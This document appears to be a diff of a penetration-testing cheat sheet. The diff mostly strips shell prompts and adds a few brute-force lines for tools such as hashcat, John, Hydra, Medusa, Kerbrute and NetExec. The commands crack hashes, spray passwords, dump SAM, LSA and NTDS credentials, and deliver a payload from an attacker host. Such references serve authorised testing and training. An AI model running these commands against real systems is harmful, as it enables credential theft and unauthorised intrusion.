@@ -86,7 +86,7 @@ Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJv
 **For Loop**
 
 ```c
-$ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
+ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
 ```
 
 ### bkcrack
@@ -94,16 +94,16 @@ $ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150
 #### Cracking .zip File
 
 ```c
-$ ./bkcrack -L <FILE>.zip
+ ./bkcrack -L <FILE>.zip
 ```
 
 ```c
-$ cat plaintext.txt
+ cat plaintext.txt
 Secret:HTB{
 ```
 
 ```c
-$ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
+ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
 ```
 
 ### DonPAPI
@@ -111,16 +111,16 @@ $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p 
 > https://github.com/login-securite/DonPAPI
 
 ```c
-$ DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
-$ DonPAPI -local_auth <USERNAME>@<RHOST>
-$ DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
-$ DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
+ DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
+ DonPAPI -local_auth <USERNAME>@<RHOST>
+ DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
+ DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 ```
 
 ### fcrack
 
 ```c
-$ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
+ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
 ```
 
 ### Group Policy Preferences (GPP)
@@ -130,8 +130,8 @@ $ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
 > https://github.com/t0thkr1s/gpp-decrypt
 
 ```c
-$ python3 gpp-decrypt.py -f Groups.xml
-$ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+ python3 gpp-decrypt.py -f Groups.xml
+ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
 
 ### Hash-Buster
@@ -139,7 +139,7 @@ $ python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOs
 > https://github.com/s0md3v/Hash-Buster
 
 ```c
-$ buster -s 2b6d315337f18617ba18922c0b9597ff
+ buster -s 2b6d315337f18617ba18922c0b9597ff
 ```
 
 ### hashcat
@@ -155,23 +155,23 @@ $ buster -s 2b6d315337f18617ba18922c0b9597ff
 #### Common Commands
 
 ```c
-$ hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
-$ hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
-$ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
+ hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
+ hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
+ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
 ```
 
 #### Hash Example Search
 
 ```c
-$ hashcat --example-hashes
-$ hashcat --help | grep -i "ntlm"
+hashcat --example-hashes
+hashcat --help | grep -i "ntlm"
 ```
 
 #### Hash Rules
@@ -188,7 +188,7 @@ $ hashcat --help | grep -i "ntlm"
 **Add a 1 to each Password**
 
 ```c
-$ echo \$1 > <FILE>.rule
+ echo \$1 > <FILE>.rule
 ```
 
 **Capitalize first character**
@@ -222,7 +222,7 @@ $1 $2 $3 c $!
 **Rule Preview**
 
 ```c
-$ hashcat -r <FILE>.rule --stdout <FILE>.txt
+ hashcat -r <FILE>.rule --stdout <FILE>.txt
 ```
 
 #### Mask File Example
@@ -242,31 +242,31 @@ FOOBAR?u?u?u?u
 #### Cracking ASPREPRoast Password File
 
 ```c
-$ hashcat -m 18200 -a 0 <FILE> <FILE>
+ hashcat -m 18200 -a 0 <FILE> <FILE>
 ```
 
 #### Cracking Kerberoasting Password File
 
 ```c
-$ hashcat -m 13100 --force <FILE> <FILE>
+ hashcat -m 13100 --force <FILE> <FILE>
 ```
 
 #### Bruteforce based on the Pattern
 
 ```c
-$ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
+ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 #### Generate Password Candidates: Wordlist + Pattern
 
 ```c
-$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
+ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 #### Generate NetNLTMv2 with internalMonologue and crack with hashcat
 
 ```c
-$ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
+ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
 ```
 
 #### Result
@@ -278,7 +278,7 @@ spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000
 #### Crack with hashcat
 
 ```c
-$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
+ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
 ```
 
 #### Rules
@@ -288,7 +288,7 @@ $ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c6
 **Cracking with OneRuleToRuleThemAll.rule**
 
 ```c
-$ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
+ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 ```
 
 ### Hydra
@@ -298,75 +298,84 @@ $ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 #### Common Commands
 
 ```c
-$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
-$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
-$ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
+ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
+ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
+ hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
 ```
 
 #### Proxy
 
 ```c
-$ export HYDRA_PROXY=connect://127.0.0.1:8080
-$ unset HYDRA_PROXY
+ export HYDRA_PROXY=connect://127.0.0.1:8080
+ unset HYDRA_PROXY
 ```
 
 #### SSH
 
 ```c
-$ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
-$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
+ hydra <RHOST> -L usernames.txt -P passwords.txt ssh -V
+ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> ssh -t 4
+hydra -l <RHOST> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
 ```
 
 #### FTP
 
 ```c
-$ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
+ hydra <RHOST> -L usernames.txt -P passwords.txt ftp -V -f
 ```
 
 #### SMB
 
 ```c
-$ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
+ hydra <RHOST> -L usernames.txt -P passwords.txt smb -V -f
 ```
 
 #### MySQL
 
 ```c
-$ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
+ hydra <RHOST> -L usernames.txt -P passwords.txt mysql -V -f
 ```
 
 #### Postgres
 
 ```c
-$ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
+ hydra <RHOST> -L usernames.txt -P passwords.txt postgres -V
 ```
 
 #### Telnet
 
 ```c
-$ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
+ hydra <RHOST> -L usernames.txt -P passwords.txt telnet -V
 ```
 
 #### VNC
 
 ```c
-$ hydra <RHOST> -P passwords.txt vnc -V
+ hydra <RHOST> -P passwords.txt vnc -V
 ```
 
 #### Docker Registry
 
 ```c
-$ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
+ hydra <RHOST> -L usernames.txt  -P passwords.txt -s 5000 https-get /v2/
 ```
 
 #### Webform
 
 ```c
-$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
-$ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
-$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
-$ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
-$ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
+ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
+ hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
+ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+```
+
+HTTP POST Attack with Hydra
+
+```bash
+hydra <RHOST> http-form-post
+"/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P
+/usr/share/wordlists/rockyou.txt -vV -f
 ```
 
 ### John
@@ -374,63 +383,63 @@ $ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/lo
 > https://github.com/openwall/john
 
 ```c
-$ john md5 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5
-$ john sha-1 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha1
-$ john sha256 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha256
-$ john bcrypt --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=bcrypt
-$ john md4 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=md4
-$ john ntlm --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=nt
-$ john sha512 --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
+ john md5 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5
+ john sha-1 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha1
+ john sha256 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha256
+ john bcrypt --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=bcrypt
+ john md4 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=md4
+ john ntlm --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=nt
+ john sha512 --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
 ```
 
 #### Show cracked Password
 
 ```c
-$ john --show <FILE>
+ john --show <FILE>
 ```
 
 #### Using Salt
 
 ```c
-$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5 --mask='<SALT>?w'
+ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5 --mask='<SALT>?w'
 ```
 
 #### Cracking .zip-Files
 
 ```c
-$ zip2john <FILE> > <FILE>
+ zip2john <FILE> > <FILE>
 ```
 
 #### Cracking EncFS/6
 
 ```c
-$ encfs2john <DIRECTORY>/ > encfs6.xml.john
-$ john encfs6.xml.john --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
+ encfs2john <DIRECTORY>/ > encfs6.xml.john
+ john encfs6.xml.john --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
 ```
 
 #### Cracking Kerberoasting Password File
 
 ```c
-$ john --format=krb5tgs --wordlist=<FILE> <FILE>
+ john --format=krb5tgs --wordlist=<FILE> <FILE>
 ```
 
 #### Cracking RSA
 
 ```c
-$ ssh2john id_rsa > <FILE>
-$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=ssh
+ ssh2john id_rsa > <FILE>
+ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=ssh
 ```
 
 #### Cracking yescrypt
 
 ```c
-$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
+ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
 ```
 
 #### Extracting Hash from .kdbx File
 
 ```c
-$ keepass2john <FILE>
+ keepass2john <FILE>
 ```
 
 ### Kerbrute
@@ -440,13 +449,13 @@ $ keepass2john <FILE>
 #### User Enumeration
 
 ```c
-$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
+ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
 ```
 
 #### Password Spray
 
 ```c
-$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
+ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
 ```
 
 ### LaZagne
@@ -462,13 +471,18 @@ C:\> laZagne.exe all
 #### Extracting LUKS Header
 
 ```c
-$ dd if=backup.img of=header.luks bs=512 count=4097
+dd if=backup.img of=header.luks bs=512 count=4097
 ```
 
 ### Medusa
 
 ```c
-$ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
+medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
+```
+
+```bash
+medusa -h <RHOST> -u admin -P /usr/share/wordlists/rockyou.txt -M http
+-m DIR:/admin
 ```
 
 ### mimikatz
@@ -587,7 +601,7 @@ mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Creden
 > https://github.com/Xre0uS/MultiDump
 
 ```c
-$ python3 MultiDumpHandler.py -r <LPORT>
+ python3 MultiDumpHandler.py -r <LPORT>
 ```
 
 ```c
@@ -599,92 +613,92 @@ PS C:\> .\MultiDump.exe --procdump -r <LHOST>:<LPORT>
 > https://github.com/Pennyw0rth/NetExec
 
 ```c
-$ sudo apt-get install pipx git
-$ pipx ensurepath
-$ pipx install git+https://github.com/Pennyw0rth/NetExec
+ sudo apt-get install pipx git
+ pipx ensurepath
+ pipx install git+https://github.com/Pennyw0rth/NetExec
 ```
 
 #### Installation via Poetry
 
 ```c
-$ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
-$ git clone https://github.com/Pennyw0rth/NetExec
-$ cd NetExec
-$ poetry install
-$ poetry run NetExec
+ sudo apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
+ git clone https://github.com/Pennyw0rth/NetExec
+ cd NetExec
+ poetry install
+ poetry run NetExec
 ```
 
 #### Modules
 
 ```c
-$ netexec ldap -L
-$ netexec mysql -L
-$ netexec smb -L
-$ netexec ssh -L
-$ netexec winrm -L
+ netexec ldap -L
+netexec mysql -L
+ netexec smb -L
+ netexec ssh -L
+ netexec winrm -L
 ```
 
 #### Common Commands
 
 ```c
-$ netexec smb <RHOST> -u '' -p '' --shares
-$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
-$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
-$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
-$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
-$ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
-$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
-$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
-$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
-$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
-$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
-$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
-$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
-$ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
-$ netexec ldap <RHOST> -u '' -p '' --asreproast
-$ netexec ldap <RHOST> -u '' -p '' -M -user-desc
-$ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
-$ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
-$ netexec ldap <RHOST> -u '' -p '' -M veeam
-$ netexec ldap <RHOST> -u '' -p '' -M maq
-$ netexec ldap <RHOST> -u '' -p '' -M adcs
-$ netexec ldap <RHOST> -u '' -p '' -M zerologon
-$ netexec ldap <RHOST> -u '' -p '' -M petitpotam
-$ netexec ldap <RHOST> -u '' -p '' -M nopac
-$ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
-$ netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
-$ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
-$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
-$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
+ netexec smb <RHOST> -u '' -p '' --shares
+ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
+ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
+ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
+ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
+ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
+ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
+ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
+ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
+ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
+ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
+ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
+ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
+ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
+ netexec ldap <RHOST> -u '' -p '' --asreproast
+ netexec ldap <RHOST> -u '' -p '' -M -user-desc
+ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
+ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
+ netexec ldap <RHOST> -u '' -p '' -M veeam
+ netexec ldap <RHOST> -u '' -p '' -M maq
+ netexec ldap <RHOST> -u '' -p '' -M adcs
+ netexec ldap <RHOST> -u '' -p '' -M zerologon
+ netexec ldap <RHOST> -u '' -p '' -M petitpotam
+ netexec ldap <RHOST> -u '' -p '' -M nopac
+ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
+ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
+ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
+ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
+ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
+ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
+ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
+ netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
+ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
+ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
+ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
+ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
